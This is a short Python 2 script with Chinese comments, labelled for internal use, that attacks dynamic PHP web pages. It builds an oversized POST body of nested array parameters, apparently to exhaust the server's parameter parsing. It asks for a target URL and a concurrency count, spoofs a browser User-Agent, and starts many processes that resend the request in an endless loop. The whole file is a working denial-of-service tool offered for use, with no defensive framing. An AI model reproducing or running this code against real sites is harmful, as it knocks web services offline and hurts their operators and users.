#!/usr/bin/env python
#-*- coding:utf-8 -*-
# 
#  攻击动态网页如：http://xxxx.php

from urllib2 import urlopen
def attack(req):
	while True:
		try: print urlopen(req, timeout=5).read()
		except: pass
if __name__=='__main__':
	import time, urllib2
	from sys import stdout
	from multiprocessing import Process
	while True:
		print 'Wang内部专用'
		data=''
		size=pow(2, 15)
		i=0
		while i<973709056:
			data+='&a[' +str(i)+ '][' +str(i)+ ']=0'
			i+=size
		data=data.lstrip()
		del i, size
		print '大小:', len(data)
		print '加载!'
		url=raw_input('目标:')
		set=raw_input('Concurrent: ')
		if not set.isdigit():
			print '\n\n\n-->Invaild input.'
			continue
		set=int(set)
		print 'Gen req-object...'
		req=urllib2.Request(url=url, data=data)
		req.add_header('User-Agent', 'Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)')
		print 'Successfully gen req-object!'
		i=0
		while i<set:
			print 'Process', i+1, 'already to send packet.'
			p = Process(target=attack, args=(req,))
			p.start()
			time.sleep(0.5)
			i+=1
		p.join()